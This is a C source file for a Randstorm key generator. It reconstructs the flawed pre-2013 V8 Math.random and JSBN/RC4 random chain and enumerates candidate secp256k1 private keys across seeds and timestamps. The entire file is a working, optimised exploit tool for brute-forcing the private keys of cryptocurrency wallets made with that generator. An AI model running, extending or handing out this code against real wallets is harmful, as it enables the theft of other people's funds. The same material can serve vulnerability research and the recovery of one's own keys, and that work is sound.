/*
 * randstorm_chain.c — E1 Randstorm candidate generator (pre-2013 V8 Math.random + JSBN).
 *
 * Chain (bit-exact port of the validated Python reference in scanner/):
 *   glibc TYPE_3 random() [seed = low32(time_ms ^ (pid << 16))]
 *     -> context words (2 per context_index)
 *     -> V8 random_base (Marsaglia MWC 18273/36969)
 *     -> math_offset skipped draws, then 128 draws -> JSBN pool (256 bytes)
 *     -> pool ^= t1 bytes 0..3 (page load), ^= t2 bytes 4..7 (first key)
 *     -> RC4 KSA -> skip rc4_offset bytes -> keys: 33-byte slices,
 *        x = slice[1..32] big-endian, key = (x mod (n-1)) + 1, output 32B BE.
 *
 * Flat enumeration order (resumable):
 *   flat = ((seed_idx * t1_count + t1_idx) * dt2_count + dt2_idx) * key_count + key_idx
 *
 * Build: gcc -O3 -shared -fPIC -o librandstorm_chain.so randstorm_chain.c
 */

#include <stdint.h>
#include <string.h>

#define GLIBC_DEG 31
#define GLIBC_SEP 3
#define POOL_SIZE 256

typedef struct {
    uint32_t seed_start;     /* first libc seed (uint32 wrap) */
    uint32_t context_index;  /* libc word-pairs consumed before this context */
    uint32_t math_offset;    /* Math.random draws skipped before the pool fill */
    uint32_t t1_count;       /* number of page-load timestamps in t1[] */
    uint32_t dt2_count;      /* number of t2 offsets in dt2[] (t2 = t1 + dt2) */
    uint32_t key_count;      /* keys generated per (seed, t1, dt2) group */
    uint32_t rc4_offset;     /* RC4 stream bytes skipped before key 0 */
    uint64_t seed_count;     /* number of seeds */
} rs_params;

/* ------------------------------- glibc random() ------------------------- */

typedef struct {
    uint32_t state[GLIBC_DEG];
    int fptr;
    int rptr;
} rs_glibc;

static uint32_t glibc_next(rs_glibc *g) {
    uint32_t value = g->state[g->fptr] + g->state[g->rptr];
    g->state[g->fptr] = value;
    uint32_t result = value >> 1;
    g->fptr += 1;
    if (g->fptr >= GLIBC_DEG) {
        g->fptr = 0;
        g->rptr += 1;
    } else {
        g->rptr += 1;
        if (g->rptr >= GLIBC_DEG) g->rptr = 0;
    }
    return result;
}

static void glibc_init(rs_glibc *g, uint32_t seed) {
    if (seed == 0) seed = 1;  /* glibc: srandom(0) behaves as srandom(1) */
    g->state[0] = seed;
    int32_t word = (int32_t)seed;
    for (int i = 1; i < GLIBC_DEG; i++) {
        int32_t hi = word / 127773;          /* C99 truncation semantics */
        int32_t lo = word % 127773;
        word = 16807 * lo - 2836 * hi;
        if (word < 0) word += 2147483647;
        g->state[i] = (uint32_t)word;
    }
    g->fptr = GLIBC_SEP;
    g->rptr = 0;
    for (int i = 0; i < GLIBC_DEG * 10; i++) glibc_next(g);
}

/* ------------------------------ V8 random_base -------------------------- */

typedef struct {
    uint32_t s0;
    uint32_t s1;
} rs_v8;

static uint32_t v8_next(rs_v8 *v) {
    v->s0 = 18273u * (v->s0 & 0xFFFFu) + (v->s0 >> 16);
    v->s1 = 36969u * (v->s1 & 0xFFFFu) + (v->s1 >> 16);
    return (v->s0 << 14) + (v->s1 & 0x3FFFFu);
}

/* Build the JSBN pool with the page-load time XOR (t1 -> bytes 0..3). */
static void build_pool(const rs_params *p, uint32_t seed, uint32_t t1, uint8_t pool[POOL_SIZE]) {
    rs_glibc g;
    glibc_init(&g, seed);
    for (uint32_t i = 0; i < p->context_index; i++) {
        glibc_next(&g);
        glibc_next(&g);
    }
    rs_v8 v;
    v.s0 = glibc_next(&g);
    v.s1 = glibc_next(&g);
    for (uint32_t i = 0; i < p->math_offset; i++) v8_next(&v);
    for (int i = 0; i < POOL_SIZE; i += 2) {
        uint32_t t = v8_next(&v) >> 16;
        pool[i] = (uint8_t)(t >> 8);
        pool[i + 1] = (uint8_t)(t & 0xFF);
    }
    for (int b = 0; b < 4; b++) pool[b] ^= (uint8_t)((t1 >> (8 * b)) & 0xFF);
}

/* ------------------------------- RC4 ------------------------------------ */

typedef struct {
    uint8_t s[256];
    uint8_t i;
    uint8_t j;
} rs_rc4;

static void rc4_init(rs_rc4 *r, const uint8_t key[POOL_SIZE]) {
    for (int i = 0; i < 256; i++) r->s[i] = (uint8_t)i;
    uint8_t j = 0;
    for (int i = 0; i < 256; i++) {
        j = (uint8_t)(j + r->s[i] + key[i]);
        uint8_t t = r->s[i];
        r->s[i] = r->s[j];
        r->s[j] = t;
    }
    r->i = 0;
    r->j = 0;
}

static uint8_t rc4_next(rs_rc4 *r) {
    r->i = (uint8_t)(r->i + 1);
    r->j = (uint8_t)(r->j + r->s[r->i]);
    uint8_t t = r->s[r->i];
    r->s[r->i] = r->s[r->j];
    r->s[r->j] = t;
    return r->s[(uint8_t)(t + r->s[r->i])];
}

/* --------------------- secp256k1 order reduction ------------------------ */

/* n - 1, little-endian limbs (limb0 = least significant 32 bits). */
static const uint32_t N1[8] = {
    0xD0364140u, 0xBFD25E8Cu, 0xAF48A03Bu, 0xBAAEDCE6u,
    0xFFFFFFFEu, 0xFFFFFFFFu, 0xFFFFFFFFu, 0xFFFFFFFFu,
};

static int ge_n1(const uint32_t x[8]) {
    for (int i = 7; i >= 0; i--) {
        if (x[i] != N1[i]) return x[i] > N1[i];
    }
    return 1;
}

static void sub_n1(uint32_t x[8]) {
    uint64_t borrow = 0;
    for (int i = 0; i < 8; i++) {
        uint64_t t = (uint64_t)x[i] - (uint64_t)N1[i] - borrow;
        x[i] = (uint32_t)t;
        borrow = (t >> 32) & 1;
    }
}

static void add_one(uint32_t x[8]) {
    uint64_t carry = 1;
    for (int i = 0; i < 8 && carry; i++) {
        uint64_t t = (uint64_t)x[i] + carry;
        x[i] = (uint32_t)t;
        carry = (t >> 32) & 1;
    }
}

/* 32 big-endian bytes -> 8 little-endian limbs */
static void bytes_to_limbs(const uint8_t b[32], uint32_t x[8]) {
    for (int i = 0; i < 8; i++) {
        int base = 28 - 4 * i;
        x[i] = ((uint32_t)b[base] << 24) | ((uint32_t)b[base + 1] << 16) |
               ((uint32_t)b[base + 2] << 8) | (uint32_t)b[base + 3];
    }
}

/* 8 little-endian limbs -> 32 big-endian bytes */
static void limbs_to_bytes(const uint32_t x[8], uint8_t b[32]) {
    for (int i = 0; i < 8; i++) {
        int base = 28 - 4 * i;
        b[base] = (uint8_t)(x[i] >> 24);
        b[base + 1] = (uint8_t)(x[i] >> 16);
        b[base + 2] = (uint8_t)(x[i] >> 8);
        b[base + 3] = (uint8_t)x[i];
    }
}

/* Consume 33 stream bytes -> 32-byte private key. */
static void key_from_stream(rs_rc4 *r, uint8_t out[32]) {
    uint8_t slice[33];
    for (int i = 0; i < 33; i++) slice[i] = rc4_next(r);
    uint32_t x[8];
    bytes_to_limbs(slice + 1, x);  /* jsbn zeroes byte 0 */
    while (ge_n1(x)) sub_n1(x);
    add_one(x);
    limbs_to_bytes(x, out);
}

/* ------------------------------ driver ---------------------------------- */

uint64_t rs_flat_total(uint64_t seed_count, uint32_t t1_count, uint32_t dt2_count, uint32_t key_count) {
    return seed_count * (uint64_t)t1_count * (uint64_t)dt2_count * (uint64_t)key_count;
}

/*
 * Generate `count` keys starting at flat index `start` into `out`
 * (32 bytes big-endian per key). Returns the number of keys written.
 * Requires: key_count >= 1, t1_count >= 1, dt2_count >= 1.
 */
uint64_t rs_generate(const rs_params *p, const uint32_t *t1_array, const uint32_t *dt2_array,
                     uint64_t start, uint64_t count, uint8_t *out) {
    uint64_t written = 0;
    uint64_t have_group = 0;
    uint32_t cur_seed = 0, cur_t1 = 0, cur_dt2 = 0;
    rs_rc4 rc4;

    for (uint64_t flat = start; written < count; flat++, written++) {
        uint64_t r = flat;
        uint32_t key_idx = (uint32_t)(r % p->key_count);
        r /= p->key_count;
        uint32_t dt2_idx = (uint32_t)(r % p->dt2_count);
        r /= p->dt2_count;
        uint32_t t1_idx = (uint32_t)(r % p->t1_count);
        r /= p->t1_count;
        uint64_t seed_idx = r;
        if (seed_idx >= p->seed_count) break;

        uint32_t seed = p->seed_start + (uint32_t)seed_idx;
        uint32_t t1 = t1_array[t1_idx];
        uint32_t t2 = t1 + dt2_array[dt2_idx];

        if (!have_group || seed != cur_seed || t1_idx != cur_t1 || dt2_idx != cur_dt2) {
            uint8_t pool[POOL_SIZE];
            build_pool(p, seed, t1, pool);
            for (int b = 0; b < 4; b++) pool[4 + b] ^= (uint8_t)((t2 >> (8 * b)) & 0xFF);
            rc4_init(&rc4, pool);
            for (uint32_t i = 0; i < p->rc4_offset; i++) rc4_next(&rc4);
            for (uint32_t k = 0; k < key_idx; k++) {
                for (int i = 0; i < 33; i++) rc4_next(&rc4);
            }
            cur_seed = seed;
            cur_t1 = t1_idx;
            cur_dt2 = dt2_idx;
            have_group = 1;
        }
        key_from_stream(&rc4, out + written * 32);
    }
    return written;
}
